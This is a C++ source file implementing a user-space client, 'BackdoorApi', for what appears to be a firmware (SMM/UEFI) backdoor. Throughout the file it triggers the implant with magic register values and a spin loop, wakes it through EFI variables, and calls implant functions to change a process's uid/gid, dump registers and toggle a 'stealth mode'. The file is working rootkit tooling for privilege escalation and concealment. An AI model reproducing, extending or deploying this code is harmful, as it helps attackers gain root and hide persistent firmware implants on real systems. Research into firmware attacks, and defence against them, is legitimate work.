#include "api.hpp"

#include <iostream>
#include <sched.h>
#include <stdexcept>
#include <unistd.h>
#include <fstream>

BackdoorApi::BackdoorApi() {
    switch_to_cpu(0);   
}

void BackdoorApi::smm_call(BackdoorApi::Params& params) const {
    
    if (needs_wakeup)
        do_wakeup();

    asm volatile (
        "                        \n\
            mov %6, %%rsi        \n\
            mov %7, %%rdi        \n\
            mov %8, %%rcx        \n\
            mov %9, %%rdx        \n\
            mov %10, %%r8        \n\
            mov %11, %%r9        \n\
                                 \n\
            xor %%rax, %%rax     \n\
        backdoor_loop_%=:        \n\
            test %%rax, %%rax    \n\
            jz backdoor_loop_%=  \n\
                                 \n\
            mov %%r9 , %5        \n\
            mov %%r8 , %4        \n\
            mov %%rdx, %3        \n\
            mov %%rcx, %2        \n\
            mov %%rdi, %1        \n\
            mov %%rsi, %0        \n\
        "
        :   "=g"(params.r[0]), "=g"(params.r[1]), "=g"(params.r[2]), \
            "=g"(params.r[3]), "=g"(params.r[4]), "=g"(params.r[5])
        :   "g"(params.r[0]), "g"(params.r[1]), "g"(params.r[2]),    \
            "g"(params.r[3]), "g"(params.r[4]), "g"(params.r[5])   
        :    "rsi", "rdi","rcx", "rdx", "r8", "r9", "rax"
    );
}

void BackdoorApi::switch_to_cpu(std::size_t cpu) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    if (sched_setaffinity(getpid(), sizeof(mask), &mask) == -1)
        throw std::runtime_error("sched_setaffinity error");
}

std::string BackdoorApi::read_efivar(const char* path) {
    std::fstream file(path, std::ios::in | std::ios::binary);

    if (!file.good())
        throw std::runtime_error("Cannot open `path`");

    std::string data(0x1000, '\0');
    file.read(data.data(), data.length());
    data.erase(0, 4);
    const auto pos = data.find('\0');
    if (pos != std::string::npos)
        data.erase(std::next(data.begin(), pos), data.end());

    return data;
}

void BackdoorApi::hello_world_test() const {
    BackdoorApi::Params params = {
        static_cast<std::uint64_t>(BackdoorApi::Function::HelloWorldTest),
        0,
        0,
        0,
        BackdoorApi::BACKDOOR_MAGIC1,
        BackdoorApi::BACKDOOR_MAGIC2
    };

    smm_call(params);

    std::cout << "Backdoor returned:\n" << std::hex;

    for (std::size_t i=0; i < 6; ++i) {
        std::cout << "r[" << i << "] = " << params.r[i] << "\n";
    }
}

std::size_t BackdoorApi::get_current_cpu() const {
    BackdoorApi::Params params = {
        static_cast<std::uint64_t>(BackdoorApi::Function::GetCurrentCpu),
        0,
        0,
        0,
        BackdoorApi::BACKDOOR_MAGIC1,
        BackdoorApi::BACKDOOR_MAGIC2
    };

    smm_call(params);

    return params.r[0];
}

std::size_t BackdoorApi::change_priv(std::uint32_t uid, std::uint32_t gid) const {
    BackdoorApi::Params params = {
        static_cast<std::uint64_t>(BackdoorApi::Function::ChangePriv),
        uid,
        gid,
        0,
        BackdoorApi::BACKDOOR_MAGIC1,
        BackdoorApi::BACKDOOR_MAGIC2
    };

    smm_call(params);

    return params.r[0];
}

std::pair<std::size_t, std::size_t> BackdoorApi::dump_register(std::size_t id) const {
    switch_to_cpu(get_current_cpu());

    BackdoorApi::Params params = {
        static_cast<std::uint64_t>(BackdoorApi::Function::DumpReg),
        id,
        0,
        0,
        BackdoorApi::BACKDOOR_MAGIC1,
        BackdoorApi::BACKDOOR_MAGIC2
    };

    smm_call(params);

    return std::make_pair(params.r[0], params.r[1]);
}

void BackdoorApi::set_stealth_mode(bool set) const {
    BackdoorApi::Params params = {
        static_cast<std::size_t>(BackdoorApi::Function::SetStealthMode),
        set,
        0,
        0,
        BackdoorApi::BACKDOOR_MAGIC1,
        BackdoorApi::BACKDOOR_MAGIC2
    };

    smm_call(params);
}

void BackdoorApi::wakeup() {
    needs_wakeup = true;
}

void BackdoorApi::do_wakeup() {
    read_efivar(BackdoorApi::WAKEUP_EFIVAR_PATH);
}

std::pair<std::string, std::string> BackdoorApi::get_status() const {
    return std::make_pair(
        read_efivar(BackdoorApi::STATUS_SMM_EFIVAR_PATH),
        read_efivar(BackdoorApi::STATUS_DXE_EFIVAR_PATH)
    );
}
